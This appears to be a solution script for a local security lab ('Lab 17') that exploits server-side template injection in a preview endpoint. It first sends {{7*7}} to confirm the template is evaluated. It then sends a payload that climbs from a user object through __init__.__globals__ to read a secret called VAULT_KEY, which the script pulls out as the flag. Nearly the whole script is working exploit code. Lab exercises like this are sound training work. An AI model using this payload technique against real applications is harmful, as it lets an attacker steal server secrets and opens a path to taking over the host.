#!/usr/bin/env bash
# Lab 17 — no builtins, but any object leads back to its module's globals.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:9170}"
. "$(dirname "$0")/../lib/h5i.sh"
new_session lab17

"$H5I" browser open "$URL/api/preview?tpl=hi" --session "$SESSION" --new --capture >/dev/null

# 1. Confirm it evaluates rather than interpolates.
send "$SESSION" req_0 --set 'query.tpl={{7*7}}' | body >&2; echo >&2

# 2. Walk from the one object in scope to the module that defines it.
send "$SESSION" req_0 --set 'query.tpl={{user.__init__.__globals__["VAULT_KEY"]}}' | flag
